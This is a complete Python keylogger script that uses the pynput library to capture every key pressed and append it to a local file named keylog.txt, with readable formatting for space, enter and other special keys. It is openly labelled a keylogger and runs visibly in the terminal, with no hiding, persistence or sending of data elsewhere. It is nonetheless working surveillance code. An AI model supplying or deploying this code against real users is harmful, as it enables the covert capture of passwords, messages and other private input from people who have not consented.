from pynput.keyboard import Listener

# Define the file where keystrokes will be logged
log_file = "keylog.txt"

def write_to_file(key):
    """
    This function captures the key pressed and writes it to the log file.
    It formats special keys (like Space and Enter) to make the log readable.
    """
    key_data = str(key).replace("'", "")
    
    with open(log_file, "a") as f:
        # Format the output for better readability
        if key_data == "Key.space":
            f.write(" ")
        elif key_data == "Key.enter":
            f.write("\n")
        elif "Key" in key_data:
            f.write(f" [{key_data}] ")
        else:
            f.write(key_data)

def on_press(key):
    # Trigger the write function whenever a key is pressed
    write_to_file(key)

print("--- 🛡️ Basic Keylogger Started ---")
print("Listening for keystrokes...")
print(f"Saving data to: {log_file}")
print("Press Ctrl+C in the terminal to stop.")

# Start listening to the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
  
